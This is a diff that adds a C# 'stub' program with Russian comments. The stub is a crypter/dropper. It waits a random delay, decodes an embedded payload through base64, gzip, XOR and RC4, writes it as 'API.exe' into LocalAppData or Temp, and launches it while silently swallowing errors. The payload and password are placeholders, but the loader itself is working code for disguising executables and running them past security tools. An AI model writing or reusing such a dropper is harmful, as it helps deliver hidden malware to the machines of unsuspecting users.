@@ -1,0 +1,126 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Text;
+using System.Threading;
+using System.IO.Compression;
+using System.Reflection;
+
+namespace StubEch
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Thread.Sleep(new Random(Environment.TickCount).Next(500, 5500)); // Делаем рандомную задержку перед запуском
+            byte[] encryptedBytes = StringToByteArray(XOR(DecompressString("[BYTES]"))); // Сначала принимаем строку зашифрованных байтов (RC4 + XOR), декодируем XOR, в конце получаем зашифрованные байты.
+            byte[] passBytes = Encoding.Default.GetBytes(DecompressString("[PASSWORD]")); // Получаем байты пароля для RC4
+            byte[] decryptedBytes = RC4(passBytes, encryptedBytes); // Декодируем байты
+            DAR(decryptedBytes, "API.exe"); // Дропаем и запускаем чистый файл      
+        }
+
+        static void DAR(byte[] bytes, string fileName) // В качестве аргументов принимаем байты и имя файла
+        {
+            string[] dirs = new string[] // Создаём массив папок, в один из которых будет дропаться файл
+               {
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), // LocalAppData
+                    Path.GetTempPath() // Temp
+                };
+
+            Random random = new Random(); // Создаём переменную random, для генерации случайного числа
+            int pathIndex = random.Next(0, dirs.Length); // Определим индекс массива рандомно
+            string filePath = dirs[pathIndex] + "\\" + fileName; // Переменная, в которой хранится полный путь до файла
+
+            try
+            {
+                if (File.Exists(filePath)) // Делаем проверку на наличие файла в папке
+                {
+                    File.Delete(filePath); // Если файл существует, то удаляем его
+                }
+
+                File.WriteAllBytes(filePath, bytes); // Записываем байты в файл
+                Process.Start(filePath); // Запускаем
+            }
+            catch { }
+        }
+
+        static byte[] StringToByteArray(string hex)
+        {
+            int NumberChars = hex.Length;
+            byte[] bytes = new byte[NumberChars / 2];
+            for (int i = 0; i < NumberChars; i += 2)
+                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+            return bytes;
+        }
+        static string XOR(string target)
+        {
+            string result = "";
+
+            for (int i = 0; i < target.Length; i++)
+            {
+                char ch = (char)(target[i] ^ 123);
+                result += ch;
+            }
+
+            //Console.WriteLine("XOR Encoded string: " + result);
+            return result;
+        }
+        public static string DecompressString(string str)
+        {
+            var value = Convert.FromBase64String(str);
+            string resultString = string.Empty;
+            if (value != null && value.Length > 0)
+            {
+                using (MemoryStream stream = new MemoryStream(value))
+                using (GZipStream zip = new GZipStream(stream, CompressionMode.Decompress))
+                using (StreamReader reader = new StreamReader(zip))
+                {
+                    resultString = reader.ReadToEnd();
+                }
+            }
+            return resultString;
+        }
+        static byte[] RC4(byte[] pwd, byte[] data)
+        {
+            int a, i, j, k, tmp;
+            int[] key, box;
+            byte[] cipher;
+
+            key = new int[256];
+            box = new int[256];
+            cipher = new byte[data.Length];
+
+            for (i = 0; i < 256; i++)
+            {
+                key[i] = pwd[i % pwd.Length];
+                box[i] = i;
+            }
+            for (j = i = 0; i < 256; i++)
+            {
+                j = (j + box[i] + key[i]) % 256;
+                tmp = box[i];
+                box[i] = box[j];
+                box[j] = tmp;
+            }
+            for (a = j = i = 0; i < data.Length; i++)
+            {
+                a++;
+                a %= 256;
+                j += box[a];
+                j %= 256;
+                tmp = box[a];
+                box[a] = box[j];
+                box[j] = tmp;
+                k = box[((box[a] + box[j]) % 256)];
+                cipher[i] = (byte)(data[i] ^ k);
+            }
+            return cipher;
+        }
+    }
+
+
+
+
+
+
+}
